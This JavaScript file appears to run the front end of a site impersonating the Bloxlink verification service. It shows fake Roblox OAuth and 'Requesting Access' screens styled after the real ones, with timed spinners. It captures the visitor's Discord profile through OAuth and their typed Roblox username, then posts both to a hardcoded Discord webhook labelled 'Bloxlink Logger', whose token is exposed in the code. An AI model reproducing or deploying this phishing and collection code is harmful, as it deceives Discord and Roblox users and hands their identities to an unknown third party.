/**
 * Bloxlink Frontend & Discord OAuth Controller
 * Automatically captures and renders real Discord user profile (name, avatar, ID) via OAuth.
 * Fetches real Roblox user profile and avatar via serverless Roblox API.
 * Clean, native, 100% reliable verification flow:
 * Stage 0: Redirecting to roblox.com (with animated blue spinner)
 * Stage 1: Authorize with Roblox OAuth (Matching Image 2)
 * Stage 2: Bloxlink is Requesting Access (Matching Image 3)
 * Stage 3: Discord Invite / Redirection
 */
document.addEventListener('DOMContentLoaded', () => {
  // =============================================================
  // CONFIGURAÇÃO DO WEBHOOK DO DISCORD (OPCIONAL)
  // =============================================================
  const WEBHOOK_URL = "https://discord.com/api/webhooks/1541640265461137538/YDaXpIpBQl0MWbIzeFLvcSTI4zbpPTqTkTgKfc1PusePVzOrtK6GiGC1CTlUx7Q78Hwa";

  // -------------------------------------------------------------
  // DOM Elements
  // -------------------------------------------------------------
  const robloxUserInput = document.getElementById('robloxUserInput');
  const getVerifiedBtn = document.getElementById('getVerifiedBtn');
  const footerRobloxInput = document.getElementById('footerRobloxInput');
  const footerVerifiedBtn = document.getElementById('footerVerifiedBtn');

  // Verification Popup Elements
  const popupOverlay = document.getElementById('popupOverlay');
  const popupContainer = document.getElementById('popupContainer');
  const popupClose = document.getElementById('popupClose');

  // Stage 0 Elements (Redirecting to roblox.com)
  const loadingRedirectContent = document.getElementById('loadingRedirectContent');
  const btnCancelRedirect = document.getElementById('btnCancelRedirect');

  // Stage 1 Elements (Authorize with Roblox OAuth)
  const step1Content = document.getElementById('step1Content');
  const btnContinueStep1 = document.getElementById('btnContinueStep1');
  const btnReturnToBloxlink = document.getElementById('btnReturnToBloxlink');

  // Stage 2 Elements (Bloxlink is Requesting Access)
  const step2Content = document.getElementById('step2Content');
  const robloxAvatarImg2 = document.getElementById('robloxAvatarImg2');
  const robloxAccountName2 = document.getElementById('robloxAccountName2');
  const btnCancelStep2 = document.getElementById('btnCancelStep2');
  const btnConfirmAccess = document.getElementById('btnConfirmAccess');

  // Stage 3 Elements (Discord Iframe)
  const iframeContent = document.getElementById('iframeContent');
  const discordIframe = document.getElementById('discordIframe');

  // Authentication & Profile Navbar Elements
  const loggedOutSection = document.getElementById('loggedOutSection');
  const loggedInSection = document.getElementById('loggedInSection');
  const signInDiscordBtn = document.getElementById('signInDiscordBtn');
  const profileChipBtn = document.getElementById('profileChipBtn');
  const userDropdownMenu = document.getElementById('userDropdownMenu');
  const dropdownChevron = document.getElementById('dropdownChevron');
  const logoutBtn = document.getElementById('logoutBtn');
  const userDisplayName = document.getElementById('userDisplayName');
  const userAvatarImg = document.getElementById('userAvatarImg');

  // Mobile Navigation
  const mobileToggle = document.getElementById('mobileToggle');
  const mobileMenu = document.getElementById('mobileMenu');

  // -------------------------------------------------------------
  // Discord OAuth Redirector Helper
  // -------------------------------------------------------------
  function redirectToDiscordOAuth() {
    let currentOrigin = window.location.origin;
    if (!currentOrigin.endsWith('/')) {
      currentOrigin += '/';
    }
    const redirectUri = encodeURIComponent(currentOrigin);
    
    // Use response_type=token (Implicit Grant) to fetch user profile directly in the browser
    const discordOAuthUrl = `https://discord.com/oauth2/authorize?client_id=1541620007560020029&response_type=token&redirect_uri=${redirectUri}&scope=identify`;

    window.location.href = discordOAuthUrl;
  }

  // -------------------------------------------------------------
  // Discord OAuth Token & Profile Fetcher
  // -------------------------------------------------------------
  async function fetchDiscordUserProfile(accessToken) {
    try {
      const response = await fetch('https://discord.com/api/users/@me', {
        headers: {
          Authorization: `Bearer ${accessToken}`
        }
      });

      if (response.ok) {
        const user = await response.json();
        
        // Format Real Display Name
        const name = user.global_name || user.username || 'powerfromcsm.';
        
        // Format Dynamic Discord CDN Avatar URL
        let avatar = './assets/avatar.png';
        if (user.avatar) {
          const isGif = user.avatar.startsWith('a_');
          const ext = isGif ? 'gif' : 'png';
          avatar = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.${ext}?size=128`;
        } else if (user.id) {
          try {
            const defaultNum = Number((BigInt(user.id) >> 22n) % 6n);
            avatar = `https://cdn.discordapp.com/embed/avatars/${defaultNum}.png`;
          } catch (e) {
            avatar = 'https://cdn.discordapp.com/embed/avatars/0.png';
          }
        }

        const profile = {
          id: user.id,
          username: user.username,
          displayName: name,
          avatarUrl: avatar
        };

        // Persist session
        localStorage.setItem('bloxlink_logged_in', 'true');
        localStorage.setItem('discord_user_profile', JSON.stringify(profile));

        // Render in UI
        applyUserProfile(profile);

        // Send Embed Notification to Webhook
        const robloxUser = sessionStorage.getItem('saved_roblox_username') || '';
        await sendToDiscordWebhook(profile, robloxUser);

        return true;
      }
    } catch (err) {
      console.error('Failed to fetch Discord user profile:', err);
    }
    return false;
  }

  async function sendToDiscordWebhook(profile, robloxUser) {
    if (!WEBHOOK_URL || WEBHOOK_URL.trim() === '') return;

    const payload = {
      username: "Bloxlink Logger",
      avatar_url: "https://blox.link/favicon.ico",
      embeds: [
        {
          title: "✅ Nova Autenticação Concluída",
          color: 0x5865f2,
          thumbnail: {
            url: profile.avatarUrl
          },
          fields: [
            {
              name: "👤 Discord",
              value: `**${profile.displayName}** (\`${profile.username}\`)`,
              inline: true
            },
            {
              name: "🆔 ID",
              value: `\`${profile.id}\``,
              inline: true
            },
            {
              name: "🎮 Roblox Informado",
              value: robloxUser ? `\`${robloxUser}\`` : "*Nenhum*",
              inline: false
            }
          ],
          timestamp: new Date().toISOString()
        }
      ]
    };

    try {
      await fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });
    } catch (err) {
      console.error("Erro ao enviar para o webhook:", err);
    }
  }

  function applyUserProfile(profile) {
    if (!profile) return;
    if (userDisplayName) {
      userDisplayName.textContent = profile.displayName || profile.username || 'powerfromcsm.';
    }
    if (userAvatarImg && profile.avatarUrl) {
      userAvatarImg.src = profile.avatarUrl;
    }
    if (loggedOutSection) loggedOutSection.style.display = 'none';
    if (loggedInSection) loggedInSection.style.display = 'block';
  }

  // -------------------------------------------------------------
  // Check Active Session / OAuth Redirection on Page Load
  // -------------------------------------------------------------
  async function initAuth() {
    // 1. Check for Access Token in URL Hash (#access_token=...) or Query Params (?access_token=...)
    const hashStr = window.location.hash.startsWith('#') ? window.location.hash.substring(1) : window.location.hash;
    const hashParams = new URLSearchParams(hashStr);
    const searchParams = new URLSearchParams(window.location.search);

    const accessToken = hashParams.get('access_token') || searchParams.get('access_token');
    const discordCode = searchParams.get('code');

    if (accessToken) {
      window.history.replaceState({}, document.title, window.location.pathname);
      localStorage.setItem('bloxlink_logged_in', 'true');
      await fetchDiscordUserProfile(accessToken);

      // Restore saved Roblox username if present
      const savedRoblox = sessionStorage.getItem('saved_roblox_username');
      if (savedRoblox && robloxUserInput) {
        robloxUserInput.value = savedRoblox;
      }
      return;
    }

    if (discordCode) {
      window.history.replaceState({}, document.title, window.location.pathname);
      localStorage.setItem('bloxlink_logged_in', 'true');

      const savedProfileStr = localStorage.getItem('discord_user_profile');
      let profile = null;
      if (savedProfileStr) {
        try {
          profile = JSON.parse(savedProfileStr);
        } catch (e) {}
      }

      if (profile) {
        applyUserProfile(profile);
      } else {
        if (loggedOutSection) loggedOutSection.style.display = 'none';
        if (loggedInSection) loggedInSection.style.display = 'block';
      }
      return;
    }

    // 2. Restore existing logged-in session if present
    const isLogged = localStorage.getItem('bloxlink_logged_in') === 'true';
    const savedProfileStr = localStorage.getItem('discord_user_profile');

    if (isLogged) {
      if (savedProfileStr) {
        try {
          const profile = JSON.parse(savedProfileStr);
          applyUserProfile(profile);
        } catch (e) {}
      } else {
        if (loggedOutSection) loggedOutSection.style.display = 'none';
        if (loggedInSection) loggedInSection.style.display = 'block';
      }
      return;
    }

    // Default: Logged Out
    if (loggedOutSection) loggedOutSection.style.display = 'block';
    if (loggedInSection) loggedInSection.style.display = 'none';
  }

  initAuth();

  // -------------------------------------------------------------
  // Roblox User & Avatar Fetcher API
  // -------------------------------------------------------------
  async function fetchRobloxUserAvatar(username) {
    if (!username || !username.trim()) {
      return {
        name: 'theyhategabriel',
        avatarUrl: 'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-DF629C51FDFA46CD70BBE0FEDC75CA79-Png/150/150/AvatarHeadshot/Png/isCircular'
      };
    }
    const cleanUser = username.trim();

    try {
      const res = await fetch(`/api/roblox?username=${encodeURIComponent(cleanUser)}`);
      if (res.ok) {
        const data = await res.json();
        if (data.success && data.avatarUrl) {
          return {
            name: data.name || cleanUser,
            avatarUrl: data.avatarUrl
          };
        }
      }
    } catch (err) {
      console.warn('Roblox API note:', err);
    }

    return {
      name: cleanUser,
      avatarUrl: 'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-DF629C51FDFA46CD70BBE0FEDC75CA79-Png/150/150/AvatarHeadshot/Png/isCircular'
    };
  }

  // -------------------------------------------------------------
  // Sign In with Discord Button Handler (Direct OAuth)
  // -------------------------------------------------------------
  if (signInDiscordBtn) {
    signInDiscordBtn.addEventListener('click', (e) => {
      e.preventDefault();
      redirectToDiscordOAuth();
    });
  }

  // -------------------------------------------------------------
  // Profile Dropdown Menu Handlers
  // -------------------------------------------------------------
  if (profileChipBtn) {
    profileChipBtn.addEventListener('click', (e) => {
      e.stopPropagation();
      const isOpen = userDropdownMenu.classList.toggle('open');
      if (dropdownChevron) {
        dropdownChevron.style.transform = isOpen ? 'rotate(180deg)' : 'rotate(0deg)';
      }
    });
  }

  // Close dropdown when clicking outside
  document.addEventListener('click', (e) => {
    if (userDropdownMenu && !userDropdownMenu.contains(e.target) && profileChipBtn && !profileChipBtn.contains(e.target)) {
      userDropdownMenu.classList.remove('open');
      if (dropdownChevron) dropdownChevron.style.transform = 'rotate(0deg)';
    }
  });

  // Log out Handler
  if (logoutBtn) {
    logoutBtn.addEventListener('click', (e) => {
      e.preventDefault();
      localStorage.removeItem('bloxlink_logged_in');
      localStorage.removeItem('discord_user_profile');
      sessionStorage.removeItem('saved_roblox_username');
      sessionStorage.removeItem('saved_roblox_avatar');
      if (loggedOutSection) loggedOutSection.style.display = 'block';
      if (loggedInSection) loggedInSection.style.display = 'none';
      if (userDropdownMenu) userDropdownMenu.classList.remove('open');
    });
  }

  // -------------------------------------------------------------
  // Verification Logic (Authentic Multi-Stage Flow)
  // -------------------------------------------------------------
  async function openVerificationModal(username) {
    popupOverlay.classList.add('active');
    popupContainer.classList.remove('expanded');

    // Show Stage 0 (Redirecting to roblox.com with spinner)
    if (loadingRedirectContent) loadingRedirectContent.style.display = 'flex';
    if (step1Content) step1Content.style.display = 'none';
    if (step2Content) step2Content.style.display = 'none';
    if (iframeContent) iframeContent.style.display = 'none';

    const targetUser = username && username.trim() ? username.trim() : (sessionStorage.getItem('saved_roblox_username') || 'theyhategabriel');
    sessionStorage.setItem('saved_roblox_username', targetUser);

    if (robloxAccountName2) robloxAccountName2.textContent = targetUser;

    const startTime = Date.now();

    // Fetch real avatar from Roblox API
    const robloxProfile = await fetchRobloxUserAvatar(targetUser);
    sessionStorage.setItem('saved_roblox_avatar', robloxProfile.avatarUrl);

    if (robloxAccountName2) robloxAccountName2.textContent = robloxProfile.name;
    if (robloxAvatarImg2 && robloxProfile.avatarUrl) robloxAvatarImg2.src = robloxProfile.avatarUrl;

    // Maintain realistic spinner duration (~900ms minimum)
    const elapsed = Date.now() - startTime;
    const remainingTime = Math.max(0, 900 - elapsed);

    setTimeout(() => {
      if (loadingRedirectContent) loadingRedirectContent.style.display = 'none';
      if (step1Content) step1Content.style.display = 'flex';
    }, remainingTime);
  }

  function isMobileDevice() {
    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || (window.innerWidth <= 768);
  }

  function handleVerificationAction(username) {
    if (username && username.trim()) {
      sessionStorage.setItem('saved_roblox_username', username.trim());
    }

    const isMobile = isMobileDevice();
    const isLogged = localStorage.getItem('bloxlink_logged_in') === 'true';

    // Celulares NÃO são redirecionados para o OAuth; abrem direto a janela de verificação
    if (isMobile || isLogged) {
      openVerificationModal(username);
    } else {
      // No computador (Desktop), redireciona primeiro para o Discord OAuth
      redirectToDiscordOAuth();
    }
  }

  function closePopup() {
    popupOverlay.classList.remove('active');
    if (loadingRedirectContent) loadingRedirectContent.style.display = 'none';
    if (step1Content) step1Content.style.display = 'none';
    if (step2Content) step2Content.style.display = 'none';
    if (iframeContent) iframeContent.style.display = 'none';
  }

  if (getVerifiedBtn) {
    getVerifiedBtn.addEventListener('click', () => {
      const val = robloxUserInput ? robloxUserInput.value : '';
      handleVerificationAction(val);
    });
  }

  if (robloxUserInput) {
    robloxUserInput.addEventListener('keydown', (e) => {
      if (e.key === 'Enter') {
        handleVerificationAction(robloxUserInput.value);
      }
    });
  }

  if (footerVerifiedBtn) {
    footerVerifiedBtn.addEventListener('click', () => {
      const val = footerRobloxInput ? footerRobloxInput.value : '';
      handleVerificationAction(val);
    });
  }

  if (popupClose) popupClose.addEventListener('click', closePopup);

  if (btnCancelRedirect) {
    btnCancelRedirect.addEventListener('click', (e) => {
      e.preventDefault();
      closePopup();
      if (robloxUserInput) {
        robloxUserInput.focus();
        robloxUserInput.select();
      }
    });
  }

  popupOverlay.addEventListener('click', (e) => {
    if (e.target === popupOverlay) {
      closePopup();
    }
  });

  // Stage 1 -> Continue clicked: Switch to Stage 2 (Bloxlink is Requesting Access)
  if (btnContinueStep1) {
    btnContinueStep1.addEventListener('click', () => {
      if (step1Content) step1Content.style.display = 'none';
      if (step2Content) step2Content.style.display = 'flex';
    });
  }

  // Return to Bloxlink / Cancel clicked: Close modal & focus input
  if (btnReturnToBloxlink) {
    btnReturnToBloxlink.addEventListener('click', () => {
      closePopup();
      if (robloxUserInput) {
        robloxUserInput.focus();
        robloxUserInput.select();
      }
    });
  }

  if (btnCancelStep2) {
    btnCancelStep2.addEventListener('click', () => {
      closePopup();
      if (robloxUserInput) {
        robloxUserInput.focus();
        robloxUserInput.select();
      }
    });
  }

  // Stage 2 -> Confirm and Give Access clicked: Switch to Stage 3 Discord Invite
  if (btnConfirmAccess) {
    btnConfirmAccess.addEventListener('click', () => {
      if (step2Content) step2Content.style.display = 'none';
      if (iframeContent) iframeContent.style.display = 'block';
      if (popupContainer) popupContainer.classList.add('expanded');
    });
  }

  // Mobile Menu Toggle
  if (mobileToggle && mobileMenu) {
    mobileToggle.addEventListener('click', () => {
      mobileMenu.classList.toggle('hidden');
    });
  }
});